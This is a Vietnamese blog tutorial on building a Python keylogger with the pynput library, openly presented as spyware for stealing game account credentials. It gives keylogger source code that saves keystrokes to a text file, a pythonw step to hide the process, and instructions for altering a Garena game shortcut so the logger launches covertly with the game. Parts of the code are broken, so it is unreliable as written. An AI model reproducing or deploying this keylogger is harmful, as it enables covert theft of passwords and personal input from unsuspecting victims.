## Giới Thiệu Chung
Hello xin chào mọi người, mình đã trở lại và hôm nay mình xin chia sẽ đến các bạn cách để tạo ra 1 con "virus" gián điệp kiểm soát và giám sát nhập liệu từ bàn phím mà mình đã tham khảo, kết hợp được từ một số nguồn trên mạng (dunglailaptrinh: Youtube) :grinning: 

Lần này mình dùng Python một ngôn ngữ khá mạnh mẽ, và có nhiều thư viện hỗ trợ mạnh, và để tạo ra con virus gián điệp này mình sử dụng thư viện pynput, Thư viện này cho phép bạn kiểm soát và giám sát các thiết bị đầu vào ( hiện tại hỗ trợ phím, chuột ).

## Bắt Đầu Làm Thôi Nào
### Lên Ý Tưởng
- Virus gián điệp đánh cắp tài khoản game: tạo ra một con virus có thể ghi lại toàn bộ việc nhập liệu từ bàn phím, từ đó có thể thu thập được thông tin tài khoản và lưu nó vào 1 file .txt

- Các bước thực hiện cơ bản ( trên Windows )
    * Viết chương trình bằng Python.
    * Cho virus chạy ngầm khi nạn nhân bắt đầu khởi động game

### Cài Đặt Và Thiết Lập
**Cài đặt Python [tại đây](https://www.python.org/ftp/python/3.9.2/python-3.9.2-amd64.exe)**

**Cài  đặt Pynput: `pip install pynput`**

### Bắt Đầu Code Thôi Nào
Trong thư mục gốc của ứng dụng của bạn, Tạo file virus.py
```python
from pynput import keyboard

def on_press(key):
    if key == keyboard.Key.enter:
        key = "\n"
    if key == keyboard.Key.X:
        raise SystemExit(0)
    with open("result.txt", "a") as file:
        file.write(format(key.char))
    print(key)

def on_release(key):
    if key == keyboard.Key.X:
        # Stop listener
        return False
        
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
listener.join()
```

Thử run file `python virus.py` và thử nhập liệu, bạn sẽ thấy kết quả như sau:

![](https://images.viblo.asia/538baf0b-4436-47a6-80ef-4506b5f6f87b.png)

### Chạy ngầm, cài gián điệp vào game.
* **Chạy ngầm:** `pythonw virus.pyw`

Con virus đã được chạy ngầm trong máy và đang lưu thông tin nhập liệu.
Mở thử Task Manager và kiểm tra lại lần nữa.
![](https://images.viblo.asia/254ca19a-9b5c-4c11-9f03-4477d5c035bc.png)

* **Khởi động gián điệp cùng với game:**

Click chuột phải vào game và chọn Properties

![](https://images.viblo.asia/4c79dc0c-946a-4adc-ae2a-c941049dc725.png)
![](https://images.viblo.asia/72c5c1cc-49d6-403d-8758-9da8ee677e83.png)

Cpy dòng Target ( Shortcut này sẽ run app có target được chọn. )
  Tạo file **auto. bat** với nội dung:

```python
start "" "C:\Program Files (x86)\Garena\Garena\Garena.exe" ( Target đã copy )
start "" "C:\Users\Admin\Desktop\pynput\virus.pyw" ( Url file virus.pyw )
```

Copy URL file virus.pyw ( C:\Users\Admin\Desktop\pynput\virus.pyw )

Sau đó sửa Target của Game thành:  URL file virus.pyw đã copy

Đã xong rồi đấy :grin: Bây giờ chỉ cần khởi động Game thì con gián điệp sẽ được khởi động cùng và thực hiện ghi chép lại cử chỉ nhập liệu từ bàn phím.

Kết quả:
![](https://images.viblo.asia/2232e4b4-193a-42bc-bce8-384eaf7993ff.png)
## Lời Kết
Vậy là chúng ta đã vừa tạo xong một con "virus" rồi đấy :grinning: cũng đơn giản đúng không nào. Mình mong muốn sau bài viết này các bạn có thể biết và hiểu thêm về pynput, các bạn có thể mở rộng thêm ý tưởng mới. Và có thể tự tay mình làm những project không cần phải quá đặc biệt nhưng nó do chính bạn làm thì cũng coi như là thành quả trong quá trình bạn học được.

Và quan trọng hơn là bạn nên đề phòng khi có người khác động vào máy tính của mình nhé.
( Kiểm tra Task Manager xem nhưng tiến trình nào đang chạy không rõ nguồn gốc thì remove ngay nhé )

Nếu thấy thích thì Upvote, thấy hay thì Clip bài này của mình nhé! ^^

Cảm ơn bạn đã ghé thăm :heart_eyes: